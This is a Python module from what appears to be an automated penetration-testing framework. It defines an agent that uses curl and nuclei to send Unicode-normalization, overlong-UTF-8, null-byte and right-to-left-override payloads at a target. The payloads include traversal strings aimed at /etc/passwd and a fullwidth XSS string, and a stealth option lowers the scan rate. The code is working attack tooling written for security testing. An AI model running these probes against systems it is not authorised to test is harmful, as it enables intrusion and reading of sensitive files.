"""L5-6 EncodingAttackAgent — Unicode normalization, UTF-8 Overlong, RTLO, Null Byte injection."""

from __future__ import annotations

import asyncio
import json
import shutil
from typing import Any

from ..base import AgentResult, BaseAgent
from ..context import AgentContext
from ..registry import register
from ...evidence.schema import Evidence, EvidenceType, Severity
from ...graph.hypothesis import Hypothesis

# Encoding attack payloads organized by category
_UNICODE_NORMALIZATION_PAYLOADS = [
    # NFKC normalization bypasses
    ("\uff1c\uff53\uff43\uff52\uff49\uff50\uff54\uff1e", "fullwidth-xss", "Fullwidth XSS bypass"),
    ("\u2024/\u2024/etc/passwd", "dotted-lfi", "Unicode dotted LFI"),
    ("admin\u00ad", "soft-hyphen", "Soft hyphen admin bypass"),
    ("\uff41\uff44\uff4d\uff49\uff4e", "fullwidth-admin", "Fullwidth 'admin' normalization"),
]

_OVERLONG_UTF8_PAYLOADS = [
    ("%c0%ae%c0%ae/etc/passwd", "overlong-dot-lfi", "Overlong UTF-8 dot directory traversal"),
    ("%c0%af", "overlong-slash", "Overlong UTF-8 slash"),
    ("%e0%80%af", "3byte-overlong", "3-byte overlong encoding"),
]

_NULL_BYTE_PAYLOADS = [
    ("admin%00.jpg", "null-ext-bypass", "Null byte extension bypass"),
    ("..%00/etc/passwd", "null-traversal", "Null byte path traversal"),
    ("%00", "null-injection", "Null byte injection"),
]

_RTLO_PAYLOADS = [
    ("\u202etxt.exe", "rtlo-extension", "RTLO file extension spoofing"),
    ("\u202egpj.exe", "rtlo-jpg", "RTLO JPG spoofing"),
]


@register
class EncodingAttackAgent(BaseAgent):
    agent_id = "encoding_attack"
    description = "Unicode normalization, UTF-8 Overlong, RTLO, and Null Byte injection testing"

    async def run(self, context: AgentContext) -> AgentResult:
        target = context.mission.target
        findings: list[Evidence] = []
        hypotheses: list[Hypothesis] = []

        # Phase 1: Unicode normalization attacks
        norm_results = await self._test_unicode_normalization(target)
        for result in norm_results:
            if result["vulnerable"]:
                findings.append(Evidence(
                    agent_id=self.agent_id,
                    title=f"Unicode normalization bypass: {result['name']} on {target}",
                    severity=Severity.HIGH,
                    evidence_type=EvidenceType.HTTP_EXCHANGE,
                    description=(
                        f"The application normalizes Unicode input in a way that bypasses "
                        f"security controls. Attack type: {result['name']}. "
                        f"Payload: {result['payload_desc']}"
                    ),
                    request=result.get("request", ""),
                    response=result.get("response", "")[:4096],
                    tags=["encoding", "unicode", "normalization", result["tag"]],
                ))
                hypotheses.append(Hypothesis(
                    title=f"WAF bypass via Unicode normalization on {target}",
                    rationale=f"Unicode normalization vulnerability ({result['name']}) may bypass WAF rules",
                    probability=0.75, impact=0.85,
                    suggested_agent="web",
                ))

        # Phase 2: UTF-8 Overlong encoding
        overlong_results = await self._test_overlong_utf8(target)
        for result in overlong_results:
            if result["vulnerable"]:
                findings.append(Evidence(
                    agent_id=self.agent_id,
                    title=f"UTF-8 overlong encoding bypass: {result['name']} on {target}",
                    severity=Severity.HIGH,
                    evidence_type=EvidenceType.HTTP_EXCHANGE,
                    description=(
                        f"Server accepts overlong UTF-8 sequences, which may bypass path "
                        f"validation. Payload: {result['payload']}"
                    ),
                    request=result.get("request", ""),
                    response=result.get("response", "")[:4096],
                    tags=["encoding", "utf8", "overlong", result["tag"]],
                ))
                hypotheses.append(Hypothesis(
                    title=f"Path traversal via overlong UTF-8 on {target}",
                    rationale="Overlong UTF-8 accepted, path traversal likely possible",
                    probability=0.7, impact=0.9,
                    suggested_agent="web",
                    suggested_tool="nuclei",
                ))

        # Phase 3: Null byte injection
        null_results = await self._test_null_byte(target)
        for result in null_results:
            if result["vulnerable"]:
                findings.append(Evidence(
                    agent_id=self.agent_id,
                    title=f"Null byte injection: {result['name']} on {target}",
                    severity=Severity.HIGH,
                    evidence_type=EvidenceType.HTTP_EXCHANGE,
                    description=(
                        f"Application is vulnerable to null byte injection, which can truncate "
                        f"strings and bypass validation. Payload: {result['payload']}"
                    ),
                    request=result.get("request", ""),
                    response=result.get("response", "")[:4096],
                    tags=["encoding", "null-byte", result["tag"]],
                ))
                hypotheses.append(Hypothesis(
                    title=f"File upload bypass via null byte on {target}",
                    rationale="Null byte injection can bypass file extension validation",
                    probability=0.65, impact=0.85,
                    suggested_agent="web",
                ))

        # Phase 4: RTLO character injection
        rtlo_results = await self._test_rtlo(target)
        for result in rtlo_results:
            if result["vulnerable"]:
                findings.append(Evidence(
                    agent_id=self.agent_id,
                    title=f"RTLO character accepted: {result['name']} on {target}",
                    severity=Severity.MEDIUM,
                    evidence_type=EvidenceType.HTTP_EXCHANGE,
                    description=(
                        f"Application accepts Right-To-Left Override characters, enabling "
                        f"visual spoofing of filenames or content."
                    ),
                    request=result.get("request", ""),
                    response=result.get("response", "")[:4096],
                    tags=["encoding", "rtlo", "spoofing", result["tag"]],
                ))

        # Phase 5: Nuclei encoding templates
        nuclei_results = await self._run_nuclei_encoding(target, context.mission.stealth)
        for nf in nuclei_results:
            sev_str = nf.get("info", {}).get("severity", "info").lower()
            sev_map = {"critical": Severity.CRITICAL, "high": Severity.HIGH,
                       "medium": Severity.MEDIUM, "low": Severity.LOW}
            severity = sev_map.get(sev_str, Severity.INFO)
            name = nf.get("info", {}).get("name", nf.get("template-id", ""))
            matched = nf.get("matched-at", target)
            findings.append(Evidence(
                agent_id=self.agent_id,
                title=f"{name} — {matched}",
                severity=severity,
                evidence_type=EvidenceType.HTTP_EXCHANGE,
                description=nf.get("info", {}).get("description", ""),
                request=nf.get("request"),
                response=nf.get("response"),
                tags=["encoding", "nuclei", nf.get("template-id", "")],
            ))

        return AgentResult(
            agent_id=self.agent_id,
            findings=findings,
            hypotheses=hypotheses,
            status="completed",
            metadata={
                "unicode_tests": len(norm_results),
                "overlong_tests": len(overlong_results),
                "null_byte_tests": len(null_results),
                "rtlo_tests": len(rtlo_results),
                "vulnerabilities_found": len(findings),
            },
        )

    async def _test_unicode_normalization(self, target: str) -> list[dict[str, Any]]:
        if not shutil.which("curl"):
            return []
        results: list[dict[str, Any]] = []
        for payload, tag, desc in _UNICODE_NORMALIZATION_PAYLOADS:
            test_url = f"{target}/{payload}"
            proc = await asyncio.create_subprocess_exec(
                "curl", "-sS", "-o", "/dev/stdout", "-w", "\n%{http_code}",
                "-H", "User-Agent: Mozilla/5.0", test_url, "--max-time", "10",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.DEVNULL,
            )
            try:
                stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=15)
                output = stdout.decode(errors="replace")
                lines = output.rsplit("\n", 1)
                body = lines[0] if len(lines) > 1 else ""
                status = lines[-1].strip() if lines else "0"
                # Check for indicators of bypass
                vulnerable = (
                    status in ("200", "301", "302")
                    and len(body) > 100
                    and "404" not in body.lower()[:200]
                )
                results.append({
                    "tag": tag,
                    "name": desc,
                    "payload_desc": repr(payload),
                    "vulnerable": vulnerable,
                    "request": f"GET {test_url}",
                    "response": f"HTTP {status}\n{body[:2048]}",
                })
            except asyncio.TimeoutError:
                results.append({"tag": tag, "name": desc, "payload_desc": repr(payload), "vulnerable": False})
        return results

    async def _test_overlong_utf8(self, target: str) -> list[dict[str, Any]]:
        if not shutil.which("curl"):
            return []
        results: list[dict[str, Any]] = []
        for payload, tag, desc in _OVERLONG_UTF8_PAYLOADS:
            test_url = f"{target}/{payload}"
            proc = await asyncio.create_subprocess_exec(
                "curl", "-sS", "--path-as-is", "-o", "/dev/stdout",
                "-w", "\n%{http_code}", test_url, "--max-time", "10",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.DEVNULL,
            )
            try:
                stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=15)
                output = stdout.decode(errors="replace")
                lines = output.rsplit("\n", 1)
                body = lines[0] if len(lines) > 1 else ""
                status = lines[-1].strip()
                # Overlong bypass detected if we get non-error response
                vulnerable = (
                    status == "200"
                    and ("root:" in body or "passwd" in body or len(body) > 200)
                )
                results.append({
                    "tag": tag,
                    "name": desc,
                    "payload": payload,
                    "vulnerable": vulnerable,
                    "request": f"GET {test_url}",
                    "response": f"HTTP {status}\n{body[:2048]}",
                })
            except asyncio.TimeoutError:
                results.append({"tag": tag, "name": desc, "payload": payload, "vulnerable": False})
        return results

    async def _test_null_byte(self, target: str) -> list[dict[str, Any]]:
        if not shutil.which("curl"):
            return []
        results: list[dict[str, Any]] = []
        for payload, tag, desc in _NULL_BYTE_PAYLOADS:
            test_url = f"{target}/{payload}"
            proc = await asyncio.create_subprocess_exec(
                "curl", "-sS", "--path-as-is", "-o", "/dev/stdout",
                "-w", "\n%{http_code}", test_url, "--max-time", "10",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.DEVNULL,
            )
            try:
                stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=15)
                output = stdout.decode(errors="replace")
                lines = output.rsplit("\n", 1)
                body = lines[0] if len(lines) > 1 else ""
                status = lines[-1].strip()
                vulnerable = status == "200" and len(body) > 100
                results.append({
                    "tag": tag,
                    "name": desc,
                    "payload": payload,
                    "vulnerable": vulnerable,
                    "request": f"GET {test_url}",
                    "response": f"HTTP {status}\n{body[:2048]}",
                })
            except asyncio.TimeoutError:
                results.append({"tag": tag, "name": desc, "payload": payload, "vulnerable": False})
        return results

    async def _test_rtlo(self, target: str) -> list[dict[str, Any]]:
        if not shutil.which("curl"):
            return []
        results: list[dict[str, Any]] = []
        for payload, tag, desc in _RTLO_PAYLOADS:
            # Test RTLO in a form/upload parameter
            proc = await asyncio.create_subprocess_exec(
                "curl", "-sS", "-X", "POST", target,
                "-d", f"filename={payload}",
                "-w", "\n%{http_code}", "--max-time", "10",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.DEVNULL,
            )
            try:
                stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=15)
                output = stdout.decode(errors="replace")
                lines = output.rsplit("\n", 1)
                body = lines[0] if len(lines) > 1 else ""
                status = lines[-1].strip()
                # RTLO accepted if server doesn't reject/sanitize the character
                vulnerable = status in ("200", "201") and "\u202e" not in body
                results.append({
                    "tag": tag,
                    "name": desc,
                    "vulnerable": vulnerable,
                    "request": f"POST {target} filename={repr(payload)}",
                    "response": f"HTTP {status}\n{body[:2048]}",
                })
            except asyncio.TimeoutError:
                results.append({"tag": tag, "name": desc, "vulnerable": False})
        return results

    async def _run_nuclei_encoding(
        self, target: str, stealth: bool,
    ) -> list[dict[str, Any]]:
        if not shutil.which("nuclei"):
            return []
        rate = "10" if stealth else "100"
        cmd = [
            "nuclei", "-u", target,
            "-tags", "traversal,lfi,rfi,bypass,unicode",
            "-severity", "critical,high,medium",
            "-rate-limit", rate, "-jsonl", "-silent",
        ]
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.DEVNULL,
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=1800)
        results: list[dict[str, Any]] = []
        for line in stdout.decode().splitlines():
            if line.strip():
                try:
                    results.append(json.loads(line))
                except json.JSONDecodeError:
                    continue
        return results
